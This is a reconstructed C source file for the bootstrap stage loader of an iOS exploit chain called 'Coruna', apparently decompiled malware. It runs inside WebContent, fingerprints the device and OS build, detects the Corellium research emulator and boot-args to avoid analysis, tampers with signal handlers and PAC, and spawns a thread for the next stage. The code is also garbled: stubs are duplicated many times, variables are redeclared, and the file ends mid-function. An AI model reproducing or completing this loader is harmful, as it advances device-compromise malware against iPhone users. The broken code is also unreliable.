/*
 * Coruna bootstrap dylib — stage loader
 *
 * Mach-O export coruna_return_zero_stub: UIApplication background-task
 * wrapper, loader thread orchestration, and chain stage handoff.
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
typedef void (*bootstrap_sigaction_handler)(int);

static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}



static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}



static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}



static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}



static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}



static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}



static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

#include <coruna/bootstrap_names.h>

/* Bootstrap runtime constants (from Mach-O image) */
static uint64_t k_bootstrap_semaphore_signal_word;
static uint64_t k_bootstrap_remote_arg_a = 0x0000000000000000ULL;
static uint64_t k_bootstrap_remote_arg_b = 0x0000000000000000ULL;
static uint64_t k_bootstrap_remote_dispatch = 0x0000000000000000ULL;
static uint64_t k_bootstrap_sigaction_mask_a = 0x0000004000000000ULL;
static uint64_t k_bootstrap_sigaction_mask_b = 0x0000002020000000ULL;
static uint64_t k_bootstrap_sigaction_mask_c = 0x00000000c2000000ULL;
static uint64_t k_bootstrap_sigaction_storage = 0x0000000000000000ULL;
static uint64_t k_bootstrap_semaphore_wait_word;
static uint64_t k_bootstrap_md5_init_state = 0x3320646e61707865ULL;
static void *k_bootstrap_objc_class___uiapplication_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_sandbox_check_no_report_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_uibackgroundtaskinvalid_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_nsconcretestackblock_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_get_cpu_capabilities_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_kcfallocatordefault_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_kcfbooleanfalse_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_kcfhttpversion1_1_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_kcfrunloopcommonmodes_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_kcfrunloopdefaultmode_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_kcfstreampropertyhttpproxy_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_kcfstreampropertyhttpresponseheader_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_kcfstreampropertysslsettings_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_kcfstreamsslvalidatescertificatechain_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_mach_task_self_slot = (void *)0x0000000000000000ULL;
static void *k_bootstrap_objc_msgsend_slot = (void *)0x0000000000000000ULL;
static void *PTR_s_beginBackgroundTaskWithExpiratio_000102d8 = (void *)0x000000000000be68ULL;
static void *PTR_s_endBackgroundTask__000102e0 = (void *)0x000000000000be54ULL;
void coruna_return_zero_stub(void)
{
  coruna_return_zero();
  return;
}
void coruna_get_cpu_capabilities(void)
{
  return;
}
void coruna_return_zero_gate(uint64_t val,uint64_t id_2)
{
  int err;
  
  err = coruna_return_zero();
  if (err != 0) {
    coruna_pacia(val,id_2);
  }
  return;
}
void coruna_flush_caches(long ctx,long addr,uint size)
{
  uint u;
  uint size;
  unsigned long version;
  uint port;
  
  if ((addr == 0) || (size == 0)) {
    size = *(uint *)(ctx + 0x90);
    if (size == 0) {
      return;
    }
    addr = *(long *)(ctx + 0x88);
  }
  version = 0;
  port = size;
  do {
    size = port - 0x50000;
    if (0x4ffff < port) {
      port = 0x50000;
    }
    _sys_dcache_flush((void *)(addr + version),(unsigned long)port);
    _sys_icache_invalidate((void *)(addr + version),(unsigned long)port);
    u = (int)version + 0x50000;
    version = (unsigned long)u;
    port = size;
  } while (u < size);
  return;
}
void coruna_heap_alloc_pages(long ctx,uint page_count)
{
  uint u;
  long handle;
  uint *ptr;
  uint size;
  uint version;
  char err;
  bool err;
  void *ptr;
  
  version = *(uint *)(ctx + 0x90);
  handle = *(long *)(ctx + 0x88) + (unsigned long)version;
  ptr = (uint *)(handle + -4);
  if (*(uint **)(ctx + 0x138) != (uint *)0x0) {
    ptr = *(uint **)(ctx + 0x138);
  }
  do {
    size = *ptr;
    u = size + page_count + (uint)(size == 0) * 4;
    if (version < u) {
      return;
    }
    while (*ptr == size) {
      err = '\x01';
      err = (bool)coruna_ldrex_pass(ptr,0x10);
      if (err) {
        *ptr = u;
        err = coruna_ldrexp_clear();
      }
      if (err == '\0') {
        ptr = (void *)(handle - (unsigned long)u);
        *(void **)(ctx + 0x48) = ptr;
        *(uint *)(ctx + 0x50) = page_count;
        _bzero(ptr,(unsigned long)page_count);
        if (*(long *)(ctx + 0x120) == 0) {
          return;
        }
        coruna_loader_run(ctx,*(uint64_t *)(ctx + 0x48),*(uint32_t *)(ctx + 0x50));
        return;
      }
    }
    ClearExclusiveLocal();
  } while( true );
}
void coruna_buf_consume(long handle,unsigned long arg)
{
  if (arg <= *(uint *)(handle + 0x50)) {
    *(unsigned long *)(handle + 0x48) = *(long *)(handle + 0x48) + arg;
    *(uint *)(handle + 0x50) = *(uint *)(handle + 0x50) - (int)arg;
  }
  return;
}
void coruna_bzero_guard(uint64_t val,void *ctx,size_t len)
{
  if ((ctx != (void *)0x0) && (len != 0)) {
    _bzero(ctx,len);
  }
  return;
}
void coruna_bzero(uint64_t val,void *ctx,size_t len)
{
  _bzero(ctx,len);
  return;
}





void coruna_loader_restart(long ctx,uint64_t record_id)
{
  uint32_t scratch;
  uint64_t scratch[10];
  
  scratch[0] = 0;
  scratch = 0;
  if (((ctx != 0) && (*(char *)(ctx + 0x5eb) != '\0')) && (*(long *)(ctx + 0x5f0) != 0))
  {
    coruna_loader_run(ctx,0xcc001,0,0x730c4dfe);
    return;
  }
  coruna_loader_run(*(uint64_t *)(ctx + 0x40),ctx,record_id,scratch,&scratch);
  return;
}
void _process(void *ctx)
{
  int err;
  int status;
  mach_port_t host;
  kern_return_t lk3;
  void *ptr;
  char *ptr;
  uint64_t *ptr;
  uint64_t u;
  void **lppv8;
  uint64_t *buf;
  uint64_t size;
  uint64_t version;
  pthread_attr_t scratch [16];
  pthread_t bootargs;
  
  if (ctx == (void *)0x0) {
    return;
  }
  err = coruna_semaphore_create();
  if (err != 0) {
    return;
  }
  err = coruna_ctx_clear_slots(ctx);
  if (err != 0) {
    return;
  }
  err = coruna_find_webcontent(ctx);
  if (err != 0) {
    return;
  }
  err = coruna_is_mobilestore_ua(ctx);
  if (err != 0) {
    return;
  }
  if (0xf090efe400003 < *(long *)((long)ctx + 0xd0) + 0xffe7f6fff9900000U) {
    return;
  }
  if (*(char *)((long)ctx + 0x5e8) != '\0') {
    if (*(uint *)((long)ctx + 0xc0) < 0x100000) {
      return;
    }
    if (0x100400 < *(uint *)((long)ctx + 0xc0)) {
      err = *(int *)((long)ctx + 0xe0);
      if (err < 0x1b588bb3) {
        if (err != -0x789a1216) {
          status = -0x25cc27c3;
fail:
          if (err != status) {
            return;
          }
        }
      }
      else if (err != 0x462504d2) {
        status = 0x1b588bb3;
        goto fail;
      }
    }
  }
    scratch[0].__sig = coruna_u64_pack71(scratch[0].__sig._1_7_, 1);
  status = coruna_get_platform_serial(scratch);
  err = 0xad024;
  if ((char)scratch[0].__sig != '\0') {
    err = 0;
  }
  if (status != 0) {
    err = 0xad00b;
  }
  if (err != 0) {
    return;
  }
  if (0x1102ff < *(uint *)((long)ctx + 0xc0)) {
    return;
  }
  if (*(uint *)((long)ctx + 0xc0) < 0xe0000) {
done:
    bootargs = (pthread_t)&section_000003d0.offset;
    _bzero(scratch,0x400);
    err = _sysctlbyname("kern.bootargs",scratch,(size_t *)&bootargs,(void *)0x0,0);
    if ((err == 0) && ((char)scratch[0].__sig != '\0')) {
      if ((char)scratch[0].__sig != ' ') {
        return;
      }
      if (scratch[0].__sig._1_1_ != '\0') {
        return;
      }
    }
    if (0xf0000 < *(uint *)((long)ctx + 0xc0)) goto cleanup;
    scratch[0].__sig = coruna_u64_pack((scratch[0].__sig._4_4_), (1));
    host = _mach_host_self();
    lk3 = _host_info(host,0xb,(host_info_t)&bootargs,(mach_msg_type_number_t *)scratch);
    err = 0;
    if ((int)bootargs != 0) {
      err = 0xad024;
    }
    if (lk3 != 0) goto cleanup;
  }
  else {
    scratch[0].__sig = 8;
    bootargs = (pthread_t)0x0;
    status = _sysctlbyname("hw.l2cachesize",&bootargs,(size_t *)scratch,(void *)0x0,0);
    err = 0;
    if ((unsigned long)bootargs >> 0x14 == 0) {
      err = 0xad024;
    }
    if ((status != 0) || ((pthread_t)0xfffff < bootargs)) goto done;
  }
  if (err != 0) {
    return;
  }
cleanup:
  err = coruna_proc_vm_region(ctx);
  if ((err == 0) && (ptr = _malloc(0x648), ptr != (void *)0x0)) {
    _memcpy(ptr,ctx,0x648);
    if (*(char **)((long)ptr + 0x80) != (char *)0x0) {
      ptr = _strdup(*(char **)((long)ptr + 0x80));
      if (ptr == (char *)0x0) {
        return;
      }
      *(char **)((long)ptr + 0x80) = ptr;
    }
    buf = *(uint64_t **)((long)ptr + 0x98);
    if (buf != (uint64_t *)0x0) {
      ptr = _malloc(0x20);
      if (ptr == (uint64_t *)0x0) {
        return;
      }
      u = *buf;
      version = buf[3];
      size = buf[2];
      ptr[1] = buf[1];
      *ptr = u;
      ptr[3] = version;
      ptr[2] = size;
      *(uint64_t **)((long)ptr + 0x98) = ptr;
    }
    if (*(char **)((long)ptr + 0x78) != (char *)0x0) {
      ptr = _strdup(*(char **)((long)ptr + 0x78));
      if (ptr == (char *)0x0) {
        return;
      }
      *(char **)((long)ptr + 0x78) = ptr;
    }
    if (*(char **)((long)ptr + 0xa0) != (char *)0x0) {
      ptr = _strdup(*(char **)((long)ptr + 0xa0));
      if (ptr == (char *)0x0) {
        return;
      }
      *(char **)((long)ptr + 0xa0) = ptr;
    }
    if (*(char **)((long)ptr + 0xa8) != (char *)0x0) {
      ptr = _strdup(*(char **)((long)ptr + 0xa8));
      if (ptr == (char *)0x0) {
        return;
      }
      *(char **)((long)ptr + 0xa8) = ptr;
    }
    err = _pthread_attr_init(scratch);
    if (err == 0) {
      err = _pthread_attr_setdetachstate(scratch,2);
      if (err == 0) {
        u = coruna_get_cpu_capabilities(coruna_loader_thread);
        lppv8 = (void **)coruna_nop_0(u,0);
        _pthread_create(&bootargs,scratch,lppv8,ptr);
      }
      _pthread_attr_destroy(scratch);
    }
  }
  return;
}
void coruna_loader_thread(long ctx)
{
  bool err;
  uint8_t *ptr;
  int err;
  long handle;
  uint8_t *buf;
  uint64_t u;
  bootstrap_sigaction_handler *p_Var7;
  uint64_t extraout_x1;
  uint64_t *str;
  size_t ls9;
  bootstrap_sigaction_handler *p_Var10;
  uint8_t u[16];
  uint8_t size[16];
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  __sigaction_u *p_Stack_90;
  __sigaction_u action;
  __sigaction_u *block_ctx;
  uint64_t stack_guard;
  bootstrap_sigaction_handler *sa_saved;
  sigaction sa_new;
  uint32_t path_buf;
  
  path_buf = 0xad000;
  if ((*(ushort *)(ctx + 0xc2) < 0xf) && (err = coruna_return_zero_stub(), err != 0)) {
    action.__sa_handler = (bootstrap_sigaction_handler *)coruna_return_zero_gate(coruna_abort,0);
    block_ctx = (__sigaction_u *)k_bootstrap_sigaction_mask_a;
    err = _sigaction(0xb,(sigaction *)&action,&sa_new);
    if (err != 0) {
      ___error();
      return;
    }
    err = true;
  }
  else {
    err = false;
  }
  action.__sa_handler = (bootstrap_sigaction_handler *)0x0;
  stack_guard = k_bootstrap_sigaction_mask_b;
  p_Var10 = *(bootstrap_sigaction_handler **)k_bootstrap_uibackgroundtaskinvalid_slot;
  block_ctx = &action;
  sa_saved = p_Var10;
  handle = _objc_alloc(k_bootstrap_objc_class___uiapplication_slot);
  if (handle != 0) {
    scratch = k_bootstrap_nsconcretestackblock_slot;
    bootargs = k_bootstrap_sigaction_mask_c;
    thread_attr = coruna_background_task_end;
    host_info = &k_bootstrap_sigaction_storage;
    serial_buf = handle;
    p_Stack_90 = &action;
    err = coruna_return_zero_stub();
    u = extraout_x1;
    u = thread_attr;
    if (err != 0) {
      scratch = (uint8_t *)
                 coruna_nop_2(k_bootstrap_nsconcretestackblock_slot,
                              (unsigned long)&scratch | 0x6ae1000000000000);
      u = coruna_nop_0(thread_attr,&thread_attr);
      ptr = host_info;
      thread_attr = u;
      if (host_info != (uint8_t *)0x0) {
        ls9 = *(size_t *)(host_info + 8);
        buf = _malloc(ls9);
        if (buf == (uint8_t *)0x0) goto fail;
        _memcpy(buf,ptr,ls9);
        str = (uint64_t *)(buf + 0x10);
        u = coruna_nop_0(*str,str);
        *str = u;
        str = (uint64_t *)(buf + 0x18);
        size = coruna_nop_0(*str,str);
        u = size;
        u = thread_attr;
        *str = size;
        host_info = buf;
      }
    }
    thread_attr = u;
    p_Var7 = (bootstrap_sigaction_handler *)coruna_sel_beginbackgroundtask(handle,u,&scratch);
    block_ctx[3].__sa_handler = p_Var7;
    if (*(long *)(ctx + 0x80) != 0) {
      coruna_loader_restart(ctx);
      p_Var7 = block_ctx[3].__sa_handler;
    }
    if (p_Var7 != p_Var10) {
      coruna_sel_endbackgroundtask(handle);
      block_ctx[3].__sa_handler = p_Var10;
    }
    if ((err) && (err = _sigaction(0xb,&sa_new,(sigaction *)0x0), err != 0)) {
      ___error();
    }
    else if (*(char *)(ctx + 0x5ec) != '\0') {
      _exit(0);
    }
  }
fail:
  __Block_object_dispose(&action,8);
  return;
}
void coruna_background_task_end(long block,uint64_t task_id)
{
  coruna_sel_endbackgroundtask(*(uint64_t *)(block + 0x20),task_id,
               *(uint64_t *)(*(long *)(*(long *)(block + 0x28) + 8) + 0x18));
  *(uint64_t *)(*(long *)(*(long *)(block + 0x28) + 8) + 0x18) =
       *(uint64_t *)k_bootstrap_uibackgroundtaskinvalid_slot;
  return;
}
void coruna_block_assign(long handle,long addr_2)
{
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),3);
  __Block_object_assign((void *)(handle + 0x28),*(void **)(addr_2 + 0x28),8);
  return;
}
void coruna_block_dispose(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x28),8);
  __Block_object_dispose(*(void **)(handle + 0x20),3);
  return;
}
void coruna_abort(uint64_t val,uint64_t id_2,long handle)
{
  unsigned long u;
  unsigned long size;
  unsigned long *ptr;
  
  ptr = *(unsigned long **)(handle + 0x30);
  u = ptr[0x22];
  if (u >> 0x27 == 0x4000) {
    u = u & 0xffdfffffffffffff;
  }
  else {
    size = *ptr;
    if ((size & 0xffffff8000000000) == 0x2000000000000000) {
      if ((size & 0x7fffffffff) != (u & 0x7fffffffff)) goto fail;
    }
    else if ((size & 0xffffff8000000000) != 0x20000000000000 ||
             (size & 0x7fffffffff) != (u & 0x7fffffffff)) {
fail:
      _abort();
    }
    u = coruna_return_zero_gate(size & 0x7fffffffff,0x7481);
  }
  ptr[0x22] = u;
  return;
}
void coruna_read_product_version(uint *out_version)
{
  int err;
  long handle;
  long addr;
  long off;
  long base;
  long ctx_val;
  uint64_t u;
  char scratch [32];
  uint scratch;
  int bootargs;
  int thread_attr;
  
  scratch = 0;
  handle = coruna_plist_from_file("/System/Cryptexes/OS/System/Library/CoreServices/SystemVersion.plist");
  if ((handle != 0) ||
     (handle = coruna_plist_from_file("/System/Library/CoreServices/SystemVersion.plist"), handle != 0)) {
    addr = _CFStringCreateWithCString
                      (*(uint64_t *)k_bootstrap_kcfallocatordefault_slot,"ProductVersion",0x8000100);
    if (addr != 0) {
      off = _CFDictionaryGetValue(handle,addr);
      if (off != 0) {
        base = _CFGetTypeID();
        ctx_val = _CFStringGetTypeID();
        if (base == ctx_val) {
          u = _CFStringGetSystemEncoding();
          err = _CFStringGetCString(off,scratch,0x20,u);
          _CFRelease(addr);
          _CFRelease(handle);
          if (err == 0) {
            return;
          }
          err = _sscanf(scratch,"%d.%d.%d");
          if (err < 2) {
            return;
          }
          *out_version = bootargs << 8 | thread_attr << 0x10 | scratch;
          return;
        }
      }
      _CFRelease(addr);
    }
    _CFRelease(handle);
  }
  return;
}
void coruna_get_platform_serial(long out_serial)
{
  unsigned long u;
  unsigned long size;
  bool err;
  int err;
  pid_t lp5;
  long handle;
  uint32_t *ptr;
  long addr;
  long off;
  long base;
  uint version;
  stat scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  
  if (out_serial == 0) {
    return;
  }
  host_info = 0;
  thread_attr = 0;
  action = 0;
  serial_buf = 0;
  scratch = 0;
  bootargs = 0;
  thread_attr = 0;
  bootargs = 0;
  scratch.st_gen = 0;
  scratch.st_lspare = 0;
  scratch.st_blksize = 0;
  scratch.st_flags = 0;
  scratch.st_qspare[1] = 0;
  scratch.st_qspare[0] = 0;
  scratch.st_birthtimespec.tv_nsec = 0;
  scratch.st_birthtimespec.tv_sec = 0;
  scratch.st_blocks = 0;
  scratch.st_size = 0;
  scratch.st_mtimespec.tv_nsec = 0;
  scratch.st_mtimespec.tv_sec = 0;
  scratch.st_ctimespec.tv_nsec = 0;
  scratch.st_ctimespec.tv_sec = 0;
  scratch.st_rdev = 0;
  scratch = 0;
  scratch.st_uid = 0;
  scratch.st_gid = 0;
  scratch.st_atimespec.tv_nsec = 0;
  scratch.st_atimespec.tv_sec = 0;
  scratch.st_ino = 0;
  scratch.st_dev = 0;
  scratch.st_mode = 0;
  scratch.st_nlink = 0;
  err = _stat("/usr/libexec/corelliumd",&scratch);
  if (err == 0) {
    err = false;
  }
  else {
    lp5 = _getpid();
    err = _sandbox_check(lp5,"iokit-get-properties",
                           *(uint32_t *)k_bootstrap_sandbox_check_no_report_slot);
    if ((err < 1) &&
       (handle = _dlopen("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit",1), handle != 0
       )) {
      _dlsym(handle,"kIOMasterPortDefault");
      ptr = (uint32_t *)coruna_get_cpu_capabilities();
      _dlsym(handle,"IORegistryEntryFromPath");
      addr = coruna_get_cpu_capabilities();
      _dlsym(handle,"IORegistryEntryCreateCFProperty");
      off = coruna_get_cpu_capabilities();
      _dlsym(handle,"IOObjectRelease");
      base = coruna_get_cpu_capabilities();
      if ((addr != 0) && (((off != 0 && (base != 0)) && (ptr != (uint32_t *)0x0)))) {
        coruna_loader_run(*ptr,"IODeviceTree:/");
        return;
      }
      _dlclose(handle);
    }
    handle = coruna_get_cpu_capabilities(k_bootstrap_get_cpu_capabilities_slot);
    u = *(unsigned long *)(handle + 0xc) & 0xffffffffffffff00;
    if (u == 0) {
      return;
    }
    handle = coruna_get_cpu_capabilities(k_bootstrap_get_cpu_capabilities_slot);
    size = *(unsigned long *)(handle + 0xc) & 0xffffffffffffff00;
    version = 0;
    if (size != 0) {
      err = *(int *)(size + 0x80);
      if ((err == -0x6d04c838 || err == 0x37a09642) || err == 0x2c91a47e) {
        version = *(uint *)(u + 0x10) >> 0x1a & 1;
      }
      else {
        version = (uint)(*(short *)(u + 0x26) != 0x80);
      }
    }
    err = version == 0;
  }
  *(bool *)out_serial = err;
  return;
}
void coruna_cpu_cap_check_a(uint8_t *buf)
{
  unsigned long u;
  bool err;
  int err;
  long handle;
  uint8_t size;
  int status;
  uint8_t scratch;
  
  if (buf == (uint8_t *)0x0) {
    return;
  }
  scratch = 0;
  handle = coruna_get_cpu_capabilities(k_bootstrap_get_cpu_capabilities_slot);
  u = *(unsigned long *)(handle + 0xc) & 0xffffffffffffff00;
  if (u != 0) {
    err = *(int *)(u + 0x80);
    if (err < 0x1b588bb3) {
      err = err == -0x789a1216;
      status = -0x25cc27c3;
    }
    else {
      err = err == 0x1b588bb3 || err == 0x462504d2;
      status = 0x2876f5b5;
    }
    size = 0;
    if ((!err && err != status) ||
       (err = coruna_get_platform_serial(&scratch), size = scratch, err == 0)) {
      *buf = size;
    }
  }
  return;
}
void coruna_cpu_cap_check_b(uint8_t *buf)
{
  unsigned long u;
  int err;
  long handle;
  uint8_t scratch;
  
  if (buf == (uint8_t *)0x0) {
    return;
  }
  handle = coruna_get_cpu_capabilities(k_bootstrap_get_cpu_capabilities_slot);
  u = *(unsigned long *)(handle + 0xc) & 0xffffffffffffff00;
  if (u != 0) {
    err = *(int *)(u + 0x80);
    if (err == 0x7d34b9f || err == -0x17e1810a) {
      scratch = 1;
      err = coruna_get_platform_serial(&scratch);
      if (err != 0) {
        return;
      }
    }
    else {
      scratch = 0;
    }
    *buf = scratch;
  }
  return;
}
void coruna_find_webcontent(long ctx)
{
  uint u;
  unsigned long size;
  int err;
  bool err;
  kern_return_t lk5;
  int status;
  mach_port_t host;
  char *ptr;
  bool status;
  long handle;
  uint scratch;
  uint bootargs;
  uint64_t thread_attr;
  unsigned long host_info;
  size_t serial_buf;
  long action;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t block_ctx;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t stack_guard;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t sa_new;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t path_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t tmp_buf;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t region;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t plist;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t cache_27;
  uint64_t url_buf;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t cache_30;
  uint64_t json_buf;
  uint64_t cache_31;
  uint64_t cache_32;
  uint64_t cache_33;
  uint64_t frame;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t cache_36;
  uint64_t work;
  uint64_t cache_37;
  uint64_t cache_38;
  uint64_t cache_39;
  uint64_t cache;
  uint64_t cache_40;
  uint64_t cache_41;
  uint64_t cache_42;
  uint64_t cache_20;
  uint64_t cache_43;
  uint64_t cache_44;
  uint64_t cache_45;
  uint64_t cache_21;
  uint64_t cache_46;
  uint64_t cache_47;
  uint64_t cache_48;
  
  serial_buf = coruna_u64_pack((serial_buf), (5));
  lk5 = _task_info(*(task_name_t *)k_bootstrap_mach_task_self_slot,0x11,(task_info_t)&action,
                     (mach_msg_type_number_t *)&serial_buf);
  if ((lk5 == 0 && action != 0) && (handle = *(long *)(action + 0x20), handle != 0)) {
    err = *(int *)(handle + 4);
    u = *(uint *)(handle + 8) & 0xffffff;
    *(int *)(ctx + 0xd8) = err;
    *(uint *)(ctx + 0xdc) = u;
    status = *(int *)(action + 4);
    if ((status != 0) && (handle = *(long *)(action + 8), handle != 0)) {
      ptr = _strstr(*(char **)(handle + 8),"WebContent");
      if (ptr == (char *)0x0) {
        ptr = _strstr(*(char **)(handle + (unsigned long)(status - 1) * 0x18 + 8),"WebContent");
        err = ptr != (char *)0x0;
      }
      else {
        err = true;
      }
      *(bool *)(ctx + 0x5fc) = err;
      handle = coruna_get_cpu_capabilities(k_bootstrap_get_cpu_capabilities_slot);
      size = *(unsigned long *)(handle + 0xc) & 0xffffffffffffff00;
      if (size != 0) {
        *(uint32_t *)(ctx + 0xe0) = *(uint32_t *)(size + 0x80);
        handle = coruna_get_cpu_capabilities(k_bootstrap_get_cpu_capabilities_slot);
        size = *(unsigned long *)(handle + 0xc) & 0xffffffffffffff00;
        if (size != 0) {
          *(uint64_t *)(ctx + 0x640) = *(uint64_t *)(size + 0x38);
          status = coruna_read_product_version(&scratch);
          if (status == 0) {
            *(uint *)(ctx + 0xc0) = scratch;
            cache_46 = 0;
            cache_21 = 0;
            cache_48 = 0;
            cache_47 = 0;
            cache_43 = 0;
            cache_20 = 0;
            cache_45 = 0;
            cache_44 = 0;
            cache_40 = 0;
            cache = 0;
            cache_42 = 0;
            cache_41 = 0;
            cache_37 = 0;
            work = 0;
            cache_39 = 0;
            cache_38 = 0;
            cache_34 = 0;
            frame = 0;
            cache_36 = 0;
            cache_35 = 0;
            cache_31 = 0;
            json_buf = 0;
            cache_33 = 0;
            cache_32 = 0;
            cache_28 = 0;
            url_buf = 0;
            cache_30 = 0;
            cache_29 = 0;
            cache_25 = 0;
            plist = 0;
            cache_27 = 0;
            cache_26 = 0;
            cache_22 = 0;
            region = 0;
            cache_24 = 0;
            cache_23 = 0;
            cache = 0;
            tmp_buf = 0;
            cache_21 = 0;
            cache_20 = 0;
            json_buf = 0;
            path_buf = 0;
            work = 0;
            frame = 0;
            region = 0;
            sa_new = 0;
            url_buf = 0;
            plist = 0;
            sa_new = 0;
            sa_saved = 0;
            tmp_buf = 0;
            path_buf = 0;
            block_ctx = 0;
            stack_guard = 0;
            sa_saved = 0;
            stack_guard = 0;
            host_info = 0;
            block_ctx = 0;
            action = 0;
            serial_buf = 0;
            scratch = 0;
            action = 0;
            thread_attr = 0;
            bootargs = 0;
            if ((scratch & 0xfe0000) < 0xd0001) {
              host = _mach_host_self();
              status = _host_kernel_version(host,(char *)&action);
            }
            else {
              host_info = 0x400000001;
              serial_buf = 0x200;
              status = _sysctl((int *)&host_info,2,&action,&serial_buf,(void *)0x0,0);
            }
            if (((status == 0) &&
                (ptr = _strstr((char *)&action,"RELEASE"), ptr != (char *)0x0)) &&
               (ptr = _strstr((char *)&action,"xnu-"), ptr != (char *)0x0)) {
              serial_buf = serial_buf & 0xffffffff00000000;
              host_info = host_info & 0xffffffff00000000;
              thread_attr = 0;
              bootargs = 0;
              status = _sscanf(ptr,"xnu-%d.%d.%d.%d.%d%*s");
              if (2 < status) {
                *(uint *)(ctx + 200) =
                     (uint)serial_buf << 0x12 | ((uint)host_info & 0x1ff) << 9 |
                     thread_attr & 0x1ff;
                *(unsigned long *)(ctx + 0xd0) =
                     (unsigned long)(uint)((int)thread_attr << 10) & 0xffc00 |
                     ((unsigned long)((uint)serial_buf & 0x7fff) << 0x14 |
                      (unsigned long)((uint)host_info << 10) & 0xfffff | (unsigned long)thread_attr & 0x3ff) <<
                     0x14 | (unsigned long)bootargs & 0x3ff;
                status = coruna_cpu_cap_check_b(&action);
                if (status == 0) {
                  *(uint8_t *)(ctx + 0x5c0) = (uint8_t)action;
                  status = coruna_cpu_cap_check_a(&serial_buf);
                  if (status == 0) {
                    status = false;
                    *(char *)(ctx + 0x5c1) = (char)serial_buf;
                    if ((err == 0x100000c) && (1 < u)) {
                      u = scratch >> 0x10 & 0xff;
                      if (u < 0xd) {
                        status = u == 0xc && (scratch & 0xff00) != 0;
                      }
                      else {
                        status = true;
                      }
                    }
                    *(bool *)(ctx + 0x5c3) = status;
                    if ((((char)serial_buf == '\0') || (*(uint *)(ctx + 0xc0) >> 10 < 0x3c1)) ||
                       ((err = *(int *)(ctx + 0xe0), err != -0x789a1216 &&
                        ((err != -0x25cc27c3 && (err != 0x2876f5b5)))))) {
                      err = false;
                    }
                    *(bool *)(ctx + 0x5e9) = err;
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return;
}
void coruna_plist_from_file(char *path)
{
  int err;
  size_t ls2;
  long handle;
  long addr;
  long off;
  uint64_t u;
  long scratch;
  
  scratch = 0;
  u = *(uint64_t *)k_bootstrap_kcfallocatordefault_slot;
  ls2 = _strlen(path);
  handle = _CFURLCreateFromFileSystemRepresentation(u,path,ls2,0);
  if (handle != 0) {
    addr = _CFReadStreamCreateWithFile(u,handle);
    if (addr != 0) {
      err = _CFReadStreamOpen();
      if (err != 0) {
        off = _CFPropertyListCreateWithStream(u,addr,0,0,0,&scratch);
        if (off == 0 && scratch != 0) {
          _CFRelease();
        }
        _CFReadStreamClose(addr);
      }
      _CFRelease(handle);
      handle = addr;
    }
    _CFRelease(handle);
  }
  return;
}





void coruna_pacia(void)
{
  return;
}





void coruna_nop_4(void)
{
  return;
}





void coruna_nop_5(void)
{
  return;
}





void coruna_nop_6(void)
{
  return;
}
uint64_t coruna_return_zero(void)
{
  return 0;
}





void coruna_svc_indirect_0(void (*indirect_target)
{
  (*indirect_target)();
  return;
}





void coruna_svc_indirect_1(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
